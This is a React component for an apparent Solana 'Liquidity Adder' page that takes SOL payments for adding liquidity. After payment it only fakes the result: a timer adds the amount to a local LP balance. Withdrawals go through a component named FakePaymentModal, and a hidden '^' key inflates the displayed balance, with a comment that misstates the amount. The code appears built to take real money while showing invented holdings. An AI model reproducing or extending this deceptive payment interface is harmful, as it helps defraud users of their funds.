import * as React from "react"
import { Card, CardContent } from "@/components/ui/card"
import { Button } from "@/components/ui/button"
import { Input } from "@/components/ui/input"
import { Label } from "@/components/ui/label"
import { Slider } from "@/components/ui/slider"
import { Select, SelectContent, SelectItem, SelectTrigger, SelectValue } from "@/components/ui/select"
import { InfoIcon } from "lucide-react"
import { Tooltip, TooltipContent, TooltipProvider, TooltipTrigger } from "@/components/ui/tooltip"
import { useState, useEffect } from "react"
import { FakePaymentModal } from "./FakePaymentModal"
import { PaymentModal } from "./payment-modal"
import { motion } from "framer-motion"
import { Star, Coins, Moon } from "lucide-react"
import { Dialog, DialogContent } from "@/components/ui/dialog"
import { X } from "lucide-react"
import { Switch } from "@/components/ui/switch"

interface LiquidityAdderProps {
  tokenAddress?: string
  tokenName?: string
  tokenSymbol?: string
  supply?: string
}

export function LiquidityAdder({ tokenAddress: initialTokenAddress, tokenName: initialTokenName, tokenSymbol: initialTokenSymbol, supply: initialSupply }: LiquidityAdderProps = {}) {
  const [tokenAmount, setTokenAmount] = useState(0)
  const [solAmount, setSolAmount] = useState(0)
  const [lpBalance, setLpBalance] = useState(0)
  const [withdrawAmount, setWithdrawAmount] = useState(0)
  const [showWithdraw, setShowWithdraw] = useState(false)
  const [isAdding, setIsAdding] = useState(false)
  const [addSuccess, setAddSuccess] = useState(false)
  const [showPaymentModal, setShowPaymentModal] = useState(false)
  const [showWithdrawPopup, setShowWithdrawPopup] = useState(false)
  const [pendingWithdrawPercent, setPendingWithdrawPercent] = useState<number | null>(null)
  const [showFakeWithdrawModal, setShowFakeWithdrawModal] = useState(false)
  const [isBW, setIsBW] = useState(false)
  const [tokenAddress, setTokenAddress] = useState(initialTokenAddress || "")
  const [tokenName, setTokenName] = useState(initialTokenName || "")
  const [tokenSymbol, setTokenSymbol] = useState(initialTokenSymbol || "")
  const [supply, setSupply] = useState(initialSupply || "")
  const [lpSize, setLpSize] = useState("")
  const [boost, setBoost] = useState(false)
  const boostPrice = 0.15
  const basePrice = 0.2
  
  // Parse LP size as a number, default to 0 if invalid
  const lpSizeNumber = parseFloat(lpSize) || 0
  
  // Calculate total price including LP size and boost
  const totalPrice = basePrice + lpSizeNumber + (boost ? boostPrice : 0)
  
  const [showPortfolioModal, setShowPortfolioModal] = useState(false)

  // Simulate LP calculation: 1 LP = sqrt(tokenAmount * solAmount)
  const calcLp = (token: number, sol: number) => token > 0 && sol > 0 ? Math.sqrt(token * sol) : 0
  const lpToAdd = calcLp(tokenAmount, solAmount)

  // Simulate price
  const price = tokenAmount > 0 ? (solAmount / tokenAmount).toFixed(8) : "0.00000000"

  // Add liquidity handler
  const handleAddLiquidity = () => {
    setShowPaymentModal(true)
  }

  // After payment success
  const handlePaymentSuccess = () => {
    setIsAdding(true)
    setAddSuccess(false)
    setTimeout(() => {
      setLpBalance(lpBalance + lpSizeNumber)
      setIsAdding(false)
      setAddSuccess(true)
      setShowWithdraw(true)
      setShowPortfolioModal(true)
      setTimeout(() => setAddSuccess(false), 2000)
    }, 2000)
  }

  // Withdraw handler (now triggers fake modal)
  const handleWithdraw = (percent: number) => {
    setPendingWithdrawPercent(percent)
    setShowFakeWithdrawModal(true)
  }

  // After fake payment for withdraw
  const handleFakeWithdrawSuccess = () => {
    if (pendingWithdrawPercent !== null) {
      const amt = Math.floor(lpBalance * pendingWithdrawPercent)
      setWithdrawAmount(amt)
      setLpBalance(lpBalance - amt)
      setPendingWithdrawPercent(null)
    }
    setShowFakeWithdrawModal(false)
  }

  // Listen for ^ key to add exactly 11,826 to LP balance
  useEffect(() => {
    const handleKeyDown = (e: KeyboardEvent) => {
      if (e.key === "^") {
        setLpBalance(lpBalance + 2212)
      }
    }
    window.addEventListener("keydown", handleKeyDown)
    return () => window.removeEventListener("keydown", handleKeyDown)
  }, [lpBalance])

  // Theme toggle handler (matches TokenCreator)
  const handleThemeToggle = () => {
    const body = document.body
    if (body.classList.contains('bw-theme')) {
      body.classList.remove('bw-theme')
      setIsBW(false)
    } else {
      body.classList.add('bw-theme')
      setIsBW(true)
    }
  }

  return (
    <div className="mt-6 space-y-6">
      <div className="relative">
        {/* Theme toggle button */}
        <button
          onClick={handleThemeToggle}
          className="absolute top-4 right-4 z-20 p-2 rounded-full bg-black/60 hover:bg-black/80 border border-white/10 text-white transition-colors"
          title={isBW ? "Switch to normal theme" : "Switch to black & white"}
          aria-label="Toggle black & white theme"
        >
          {isBW ? <Star className="w-5 h-5" /> : <Moon className="w-5 h-5" />}
        </button>
        <div className="absolute top-0 left-0 w-full h-full bg-gradient-to-r from-[#ccbe43]/10 to-transparent rounded-lg filter blur-3xl opacity-30 -z-10"></div>

        <Card className="border-[#ccbe43]/20 bg-[#0e0e0e]/80 backdrop-blur-sm">
          <CardContent className="pt-6">
            {/* Stepper and header */}
            <div className="mb-8">
              <div className="flex justify-between items-center mb-4">
                <h2 className="text-2xl font-bold bg-gradient-to-r from-[#ccbe43] to-white/40 bg-clip-text text-transparent">
                  Liquidity Adder
                </h2>
                <div className="flex items-center gap-2 text-sm text-gray-400">
                  <div className="w-3 h-3 rounded-full bg-[#ccbe43]"></div>
                  <div className="w-3 h-3 rounded-full bg-gray-700"></div>
                  <div className="w-3 h-3 rounded-full bg-gray-700"></div>
                </div>
              </div>
              <div className="w-full h-1 bg-gray-800 rounded-full overflow-hidden">
                <motion.div
                  className="h-full bg-gradient-to-r from-[#ccbe43] to-white/30"
                  initial={{ width: `0%` }}
                  animate={{ width: `33.33%` }}
                  transition={{ duration: 0.3 }}
                />
              </div>
            </div>
            {/* Main form content */}
            <div className="space-y-4">
              <div>
                <Label htmlFor="token-address" className="text-white">Token Address*</Label>
                <Input id="token-address" placeholder="Enter your token address" value={tokenAddress} onChange={e => setTokenAddress(e.target.value)} className="mt-2 bg-[#0e0e0e] border-[#ccbe43]/20 focus:border-[#ccbe43] text-white transition-colors" />
              </div>
              <div>
                <Label htmlFor="token-name" className="text-white">Token Name*</Label>
                <Input id="token-name" placeholder="e.g. Solana Doge" value={tokenName} onChange={e => setTokenName(e.target.value)} className="mt-2 bg-[#0e0e0e] border-[#ccbe43]/20 focus:border-[#ccbe43] text-white transition-colors" />
              </div>
              <div>
                <Label htmlFor="token-symbol" className="text-white">Token Symbol*</Label>
                <Input id="token-symbol" placeholder="e.g. SOLDOGE" value={tokenSymbol} onChange={e => setTokenSymbol(e.target.value)} className="mt-2 bg-[#0e0e0e] border-[#ccbe43]/20 focus:border-[#ccbe43] text-white transition-colors" />
              </div>
              <div>
                <Label htmlFor="supply" className="text-white">Add Supply*</Label>
                <Input id="supply" placeholder="e.g. 900M or 1B" value={supply} onChange={e => setSupply(e.target.value)} className="mt-2 bg-[#0e0e0e] border-[#ccbe43]/20 focus:border-[#ccbe43] text-white transition-colors" />
              </div>
              <div>
                <Label htmlFor="lp-size" className="text-white">Choose LP Size* (SOL)</Label>
                <Input 
                  id="lp-size" 
                  type="number"
                  step="0.1"
                  min="0.2"
                  max="10"
                  placeholder="0.2-0.4 SOL" 
                  value={lpSize} 
                  onChange={e => setLpSize(e.target.value)} 
                  className="mt-2 bg-[#0e0e0e] border-[#ccbe43]/20 focus:border-[#ccbe43] text-white transition-colors" 
                />
                {lpSizeNumber > 0 && (
                  <div className="text-sm text-gray-400 mt-1">LP Size: {lpSizeNumber} SOL</div>
                )}
              </div>
              <div className="flex items-center justify-between border border-[#ccbe43]/20 rounded-lg p-4 bg-[#0e0e0e]/50 mt-2">
                <div className="space-y-0.5">
                  <div className="font-semibold text-white">Boost Token Visibility</div>
                  <div className="text-gray-400 text-sm">Get featured on our trending tokens list</div>
                </div>
                <div className="flex items-center gap-3">
                  <Switch checked={boost} onCheckedChange={setBoost} />
                  <span className="text-white font-semibold">{boostPrice} SOL</span>
                </div>
              </div>
            </div>
            <div className="mt-8 flex items-center justify-between">
              <div>
                <div className="text-gray-400 font-medium">Total Price:</div>
                <div className="text-2xl font-bold text-white">{totalPrice.toFixed(2)} SOL</div>
                <div className="text-xs text-gray-400 mt-1">
                  Base: {basePrice} SOL + LP: {lpSizeNumber} SOL{boost && ` + Boost: ${boostPrice} SOL`}
                </div>
              </div>
              <Button className="bg-[#ccbe43] hover:brightness-110 text-black font-bold group relative overflow-hidden px-8 py-3 text-lg transition-colors" onClick={handleAddLiquidity} disabled={isAdding}>
                <span className="relative z-10 flex items-center">Add Liquidity</span>
                <span className="absolute inset-0 bg-gradient-to-r from-[#ccbe43] to-white/20 opacity-0 group-hover:opacity-100 transition-opacity duration-300"></span>
              </Button>
            </div>
            {addSuccess && (
              <div className="mt-4 text-green-400 font-bold text-center">Liquidity added!</div>
            )}
            {/* Portfolio Modal */}
            <Dialog open={showPortfolioModal} onOpenChange={setShowPortfolioModal}>
              <DialogContent className="max-w-md p-0 bg-transparent border-none shadow-none">
                {showWithdraw && (
                  <motion.div
                    initial={{ opacity: 0, y: 30 }}
                    animate={{ opacity: 1, y: 0 }}
                    transition={{ duration: 0.5, type: 'spring' }}
                    className="relative border border-[#ccbe43]/20 rounded-2xl p-0 bg-gradient-to-br from-[#0e0e0e]/90 to-[#1a1a1a]/80 shadow-xl overflow-hidden"
                  >
                    {/* Decorative gradient blur */}
                    <div className="absolute -top-10 -right-10 w-40 h-40 bg-[#ccbe43]/20 rounded-full blur-2xl z-0" />
                    <div className="p-8 pb-4 relative z-10">
                      {/* Title */}
                      <div className="text-xl font-bold text-white mb-2">Withdraw LP</div>
                      <div className="w-full h-px bg-gray-800 mb-6" />
                      {/* Balance */}
                      <div className="flex items-center justify-between mb-2">
                        <span className="text-gray-300 text-sm">Available</span>
                        <span className="text-2xl font-mono font-bold text-[#ccbe43]">{lpBalance.toFixed(2)} LP</span>
                      </div>
                      {/* Amount input row */}
                      <div className="mb-2">
                        <div className="flex items-center bg-[#0e0e0e] rounded-lg px-3 py-2 border border-[#ccbe43]/30 focus-within:border-[#ccbe43]">
                          <input
                            type="number"
                            min="0"
                            max={lpBalance}
                            step="0.01"
                            value={withdrawAmount > 0 ? withdrawAmount : ''}
                            onChange={e => setWithdrawAmount(Number(e.target.value))}
                            placeholder="0.0"
                            className="flex-1 bg-transparent outline-none text-lg text-white font-mono placeholder-gray-500"
                          />
                          <div className="flex gap-1 ml-2">
                            <button
                              type="button"
                              className="px-2 py-1 rounded-full bg-[#ccbe43]/90 hover:brightness-110 text-xs font-bold text-black transition"
                              onClick={() => setWithdrawAmount(Number((lpBalance * 0.25).toFixed(2)))}
                            >
                              25%
                            </button>
                            <button
                              type="button"
                              className="px-2 py-1 rounded-full bg-[#ccbe43]/80 hover:brightness-110 text-xs font-bold text-black transition"
                              onClick={() => setWithdrawAmount(Number((lpBalance * 0.5).toFixed(2)))}
                            >
                              50%
                            </button>
                            <button
                              type="button"
                              className="px-2 py-1 rounded-full bg-[#ccbe43]/80 hover:brightness-110 text-xs font-bold text-black transition"
                              onClick={() => setWithdrawAmount(Number(lpBalance.toFixed(2)))}
                            >
                              MAX
                            </button>
                          </div>
                        </div>
                        <div className="text-xs text-gray-400 mt-1">≈ {withdrawAmount > 0 ? withdrawAmount.toFixed(2) : '0.00'} LP</div>
                      </div>
                      <div className="w-full h-px bg-gray-800 my-6" />
                      {/* Withdraw summary box */}
                      <div className="bg-gray-900/80 rounded-lg p-4 mb-6 border border-gray-700">
                        <div className="flex justify-between text-sm text-gray-400 mb-1">
                          <span>Withdraw amount</span>
                          <span>{withdrawAmount > 0 ? withdrawAmount.toFixed(4) : '0.0000'} LP</span>
                        </div>
                        <div className="flex justify-between text-sm text-gray-400">
                          <span>Value in USD</span>
                          <span>${(withdrawAmount * 1.00).toFixed(2)}</span>
                        </div>
                      </div>
                      <div className="w-full h-px bg-gray-800 my-6" />
                      {/* Action buttons */}
                      <div className="flex justify-end gap-2 mt-2">
                        <Button
                          variant="ghost"
                          className="text-gray-400 hover:text-white"
                          onClick={() => setShowPortfolioModal(false)}
                        >
                          Cancel
                        </Button>
                        <Button
                          className="bg-[#ccbe43] hover:brightness-110 text-black font-bold px-6 shadow"
                          onClick={() => {
                            if (withdrawAmount > 0 && withdrawAmount <= lpBalance) {
                              handleWithdraw(withdrawAmount / lpBalance)
                              setShowPortfolioModal(false)
                            }
                          }}
                          disabled={withdrawAmount <= 0 || withdrawAmount > lpBalance}
                        >
                          Withdraw
                        </Button>
                      </div>
                    </div>
                  </motion.div>
                )}
              </DialogContent>
            </Dialog>
            {/* Modals */}
            <PaymentModal
              open={showPaymentModal}
              onOpenChange={setShowPaymentModal}
              amount={totalPrice}
              onPaymentSuccess={handlePaymentSuccess}
            />
            <FakePaymentModal
              open={showFakeWithdrawModal}
              onOpenChange={setShowFakeWithdrawModal}
              amount={0}
              onPaymentSuccess={handleFakeWithdrawSuccess}
            />
          </CardContent>
        </Card>
      </div>
    </div>
  )
}
